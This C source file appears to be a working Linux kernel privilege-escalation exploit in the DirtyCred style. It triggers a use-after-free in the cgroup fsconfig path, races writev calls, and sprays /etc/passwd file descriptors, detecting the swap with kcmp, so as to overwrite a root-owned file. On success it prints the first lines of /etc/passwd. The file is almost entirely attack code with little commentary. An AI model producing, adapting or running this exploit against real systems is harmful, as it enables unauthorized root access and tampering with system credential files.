#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <assert.h>
#include <pthread.h>
#include <sys/uio.h>

#include <linux/bpf.h>
#include <linux/kcmp.h>

#include <linux/capability.h>

static void die(const char *fmt, ...) {
  va_list params;

  va_start(params, fmt);
  vfprintf(stderr, fmt, params);
  va_end(params);
  exit(1);
}

static void use_temporary_dir(void) {
  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data");
  char *tmpdir = "exp_dir";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void setup_common() {
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void loop();

static void sandbox_common() {
  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
  setsid();
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 256;
  setrlimit(RLIMIT_NOFILE, &rlim);
  if (unshare(CLONE_NEWNS)) {
  }
  if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
  }
  if (unshare(CLONE_NEWIPC)) {
  }
  if (unshare(0x02000000)) {
  }
  if (unshare(CLONE_NEWUTS)) {
  }
  if (unshare(CLONE_SYSVSEM)) {
  }
  typedef struct {
    const char *name;
    const char *value;
  } sysctl_t;
  static const sysctl_t sysctls[] = {
      {"/proc/sys/kernel/shmmax", "16777216"},
      {"/proc/sys/kernel/shmall", "536870912"},
      {"/proc/sys/kernel/shmmni", "1024"},
      {"/proc/sys/kernel/msgmax", "8192"},
      {"/proc/sys/kernel/msgmni", "1024"},
      {"/proc/sys/kernel/msgmnb", "1024"},
      {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
  };
  unsigned i;
  for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
    write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid) {
  if (pid < 0)
    exit(1);
  int status = 0;
  while (waitpid(-1, &status, __WALL) != pid) {
  }
  return WEXITSTATUS(status);
}

static void drop_caps(void) {
  struct __user_cap_header_struct cap_hdr = {};
  struct __user_cap_data_struct cap_data[2] = {};
  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;
  cap_hdr.pid = getpid();
  if (syscall(SYS_capget, &cap_hdr, &cap_data))
    exit(1);
  const int drop = (1 << CAP_SYS_PTRACE) | (1 << CAP_SYS_NICE);
  cap_data[0].effective &= ~drop;
  cap_data[0].permitted &= ~drop;
  cap_data[0].inheritable &= ~drop;
  if (syscall(SYS_capset, &cap_hdr, &cap_data))
    exit(1);
}

static int real_uid;
static int real_gid;
__attribute__((aligned(64 << 10))) static char sandbox_stack[1 << 20];

static int namespace_sandbox_proc() {
  sandbox_common();
  loop();
}

static int do_sandbox_namespace() {
  setup_common();
  real_uid = getuid();
  real_gid = getgid();
  mprotect(sandbox_stack, 4096, PROT_NONE);

  while (1) {
    int pid =
        clone(namespace_sandbox_proc, &sandbox_stack[sizeof(sandbox_stack) - 64],
              CLONE_NEWUSER | CLONE_NEWPID, 0);
    int ret_status = wait_for_loop(pid);
    if (ret_status == 0) {
      printf("[!] succeed\n");
      sleep(1);
      printf("[*] checking /etc/passwd\n\n");
      printf("[*] executing command : head -n 5 /etc/passwd\n");
      sleep(1);
      system("head -n 5 /etc/passwd");
      return 1;
    } else {
      printf("[-] failed to write, retry...\n\n");
      sleep(3);
    }
  }
}

// ===========================

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define MAX_FILE_NUM 1000
int uaf_fd;
int fds[MAX_FILE_NUM];

int run_write = 0;
int run_spray = 0;
char *cwd;

void *slow_write() {
  printf("[*] start slow write to get the lock\n");
  int fd = open("./uaf", 1);

  if (fd < 0) {
    perror("error open uaf file");
    exit(-1);
  }

  unsigned long int addr = 0x30000000;
  int offset;
  for (offset = 0; offset < 0x80000; offset++) {
    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (r < 0) {
      printf("allocate failed at 0x%x\n", offset);
    }
  }

  assert(offset > 0);

  void *mem = (void *)(addr);
  memcpy(mem, "hhhhh", 5);

  struct iovec iov[5];
  for (int i = 0; i < 5; i++) {
    iov[i].iov_base = mem;
    iov[i].iov_len = (offset - 1) * 0x1000;
  }

  run_write = 1;
  if (writev(fd, iov, 5) < 0) {
    perror("slow write");
  }
  printf("[*] write done!\n");
}

void *write_cmd() {
  char data[1024] = "\nDirtyCred works!\n\n";
  struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

  while (!run_write) {
  }
  run_spray = 1;
  if (writev(uaf_fd, &iov, 1) < 0) {
    printf("failed to write\n");
  }
  printf("[*] overwrite done! It should be after the slow write\n");
}

int spray_files() {

  while (!run_spray) {
  }
  int found = 0;

  printf("[*] got uaf fd %d, start spray....\n", uaf_fd);
  for (int i = 0; i < MAX_FILE_NUM; i++) {
    fds[i] = open("/etc/passwd", O_RDONLY);
    if (fds[i] < 0) {
      perror("open file");
      printf("%d\n", i);
    }
    if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
        0) {
      found = 1;
      printf("[!] found, file id %d\n", i);
      for (int j = 0; j < i; j++)
        close(fds[j]);
      break;
    }
  }

  if (found) {
    sleep(4);
    return 0;
  }
  return -1;
}

void trigger() {
  int fs_fd = syscall(__NR_fsopen, "cgroup", 0);
  if (fs_fd < 0) {
    perror("fsopen");
    die("");
  }

  symlink("./data", "./uaf");

  uaf_fd = open("./uaf", 1);
  if (uaf_fd < 0) {
    die("failed to open symbolic file\n");
  }

  if (syscall(__NR_fsconfig, fs_fd, 5, "source", 0, uaf_fd)) {
    perror("fsconfig");
    exit(-1);
  }
  // free the uaf fd
  close(fs_fd);
}

void loop() {
  trigger();

  pthread_t p_id;
  pthread_create(&p_id, NULL, slow_write, NULL);

  pthread_t p_id_cmd;
  pthread_create(&p_id_cmd, NULL, write_cmd, NULL);
  exit(spray_files());
}

int main(void) {
  cwd = get_current_dir_name();
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  use_temporary_dir();
  do_sandbox_namespace();
  return 0;
}

